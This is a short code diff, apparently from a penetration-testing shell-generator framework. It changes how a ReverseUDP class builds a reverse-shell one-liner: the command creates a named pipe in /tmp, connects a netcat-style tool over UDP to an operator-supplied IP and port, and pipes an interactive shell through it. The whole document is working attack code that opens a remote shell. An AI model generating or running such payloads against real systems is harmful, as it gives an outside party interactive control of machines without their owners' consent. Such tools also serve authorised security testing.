@@ -51,10 +51,10 @@ class ReverseUDP(ReverseTCP):
             # TODO reverse UDP for ncat
             print("[!] Framework doesn't support Reverse UDP for ncat")
         else:
-            self.shell = f"mkfifo fifo; {self.args.type} -u {self.args.ip} {self.args.port} "
-            self.shell += "< fifo | {"
+            self.shell = f"rm -f /tmp/fifo; mkfifo /tmp/fifo; {self.args.type} -u {self.args.ip} {self.args.port} "
+            self.shell += "< /tmp/fifo | { "
             self.shell += f"{self.args.shell} -i; "
-            self.shell += "} > fifo"
+            self.shell += "} > /tmp/fifo"
 
 
 class BindTCP(plugin.BindShell):
